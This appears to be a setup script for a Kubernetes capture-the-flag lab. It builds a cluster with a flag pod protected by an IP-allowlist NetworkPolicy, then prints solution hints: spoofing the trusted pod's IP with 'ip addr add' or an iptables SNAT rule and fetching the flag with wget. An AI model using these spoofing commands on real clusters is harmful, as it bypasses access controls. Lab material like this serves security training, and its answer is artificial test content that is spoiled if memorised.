#!/bin/bash
set -euo pipefail
K8S_ID="k8s-30"
CLUSTER_NAME="cve-k8s-30-cni-spoof"
source "$(dirname "$0")/../../scripts/k8s-common.sh"

echo "[K8S-30] CNI IP Spoofing Bypass"
k8s_init
k8s_create_host_flag
k8s_create_cluster
k8s_wait_ready

k8s_load_images alpine:latest

k8s_apply << 'YAML'
apiVersion: v1
kind: Namespace
metadata:
  name: trust-zone
  labels:
    cni: calico
---
apiVersion: v1
kind: Namespace
metadata:
  name: untrust-zone
---
# Flag pod in trust-zone, accessible only from specific pod IPs
apiVersion: v1
kind: Pod
metadata:
  name: flag-pod
  namespace: trust-zone
  labels:
    app: flag-pod
spec:
  containers:
    - name: server
      image: alpine:latest
      imagePullPolicy: IfNotPresent
      command: ["sh", "-c"]
      args:
        - |
          echo "FLAG_PLACEHOLDER" > /flag.txt
          while true; do
            printf "HTTP/1.1 200 OK\r\n\r\n$(cat /flag.txt)" | nc -l -p 8080 -w 1
          done
      ports:
        - containerPort: 8080
---
apiVersion: v1
kind: Service
metadata:
  name: flag-svc
  namespace: trust-zone
spec:
  selector:
    app: flag-pod
  ports:
    - port: 8080
---
# NetworkPolicy allowing only specific IP blocks (10.244.1.0/24)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: ip-allowlist
  namespace: trust-zone
spec:
  podSelector:
    matchLabels:
      app: flag-pod
  policyTypes:
    - Ingress
  ingress:
    - from:
        - ipBlock:
            cidr: "10.244.1.0/24"
      ports:
        - port: 8080
---
# Attacker pod in untrust-zone (different IP range)
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: untrust-zone
spec:
  containers:
    - name: attacker
      image: alpine:latest
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
---
# Allowed pod in trust-zone (whitelisted IP)
apiVersion: v1
kind: Pod
metadata:
  name: trusted-pod
  namespace: trust-zone
spec:
  containers:
    - name: app
      image: alpine:latest
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
YAML

k8s_wait_pod "flag-pod" "trust-zone"
k8s_wait_pod "attacker-pod" "untrust-zone"
k8s_wait_pod "trusted-pod" "trust-zone"
sleep 5

FLAG_IP=$(kubectl get svc flag-svc -n trust-zone -o jsonpath='{.spec.clusterIP}')
TRUSTED_IP=$(kubectl get pod trusted-pod -n trust-zone -o jsonpath='{.status.podIP}')
kubectl exec -n trust-zone flag-pod -- sh -c "echo '$FLAG' > /flag.txt" 2>/dev/null || true

k8s_info
echo "    Flag in: flag-pod (trust-zone, IP-restricted)"
echo "    Allowed IP: $TRUSTED_IP"
echo "    Flag service: flag-svc.trust-zone.svc.cluster.local:8080"
echo ""
echo "    Exploit: Spoof the trusted pod's IP to bypass NetworkPolicy"
echo "    kubectl exec -n untrust-zone attacker-pod -- ip addr add $TRUSTED_IP/32 dev eth0"
echo "    kubectl exec -n untrust-zone attacker-pod -- wget -qO- http://${FLAG_IP}:8080"
echo ""
echo "    Or use IPTables to rewrite source IP:"
echo "    kubectl exec -n untrust-zone attacker-pod -- iptables -t nat -A POSTROUTING -d ${FLAG_IP} -j SNAT --to-source $TRUSTED_IP"
